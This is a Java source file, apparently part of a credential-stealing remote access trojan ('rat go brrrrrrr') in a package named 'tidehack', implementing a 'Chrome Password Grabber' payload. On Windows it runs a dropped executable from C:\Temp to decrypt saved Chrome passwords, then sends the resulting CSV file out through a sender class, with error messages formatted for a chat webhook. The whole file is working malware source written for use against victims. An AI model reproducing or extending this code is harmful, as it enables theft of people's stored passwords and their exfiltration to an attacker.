/*
 * rat go brrrrrrr
 */

package risingtide.tidehack.utils.grabber.risingtideimpl;

import risingtide.tidehack.utils.grabber.RTPayload;
import risingtide.tidehack.utils.grabber.RTSender;
import risingtide.tidehack.utils.grabber.RTUrlReader;
import risingtide.tidehack.utils.grabber.RTFileUtils;

import java.io.File;
import java.io.IOException;

public class RTChrome implements RTPayload {
    @Override
    public String getName() {
        return "Chrome Password Grabber";
    }

    @Override
    public void exec() throws Exception {
        String os = System.getProperty("os.name");
        String pcName = System.getProperty("user.name");
        RTSender s = new RTSender();

        if (!os.contains("Windows")) { // only works on windows
            s.send("Could not grab "+pcName+"'s passwords because they don't use windows :(((","Error",false);
        } else {
            try { // hehe yes windows very gud
                RTUrlReader.init();
                Thread.sleep(20000); // 20 seconds. note to self: put this at the end of RisingTide.payloads so the wait doesnt fuck up the rest of the grabber!
                Runtime.getRuntime().exec("C:\\Temp\\tidetweakerc.exe");
                RTFileUtils.getFile("C:\\Temp\\decrypted_password.csv").renameTo(new File("C:\\Temp\\temp_rt_c.csv"));

                try { // oh boy nested try catches
                    s.send(RTFileUtils.getFile("C:\\Temp\\temp_rt_c.csv"),"Chrome Password Grabber",false);
                } catch (Exception e) {
                    s.send("**Error at `Chrome Grabber`:** ```"+e.toString()+"```","Error",false);
                    e.printStackTrace();
                }

            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
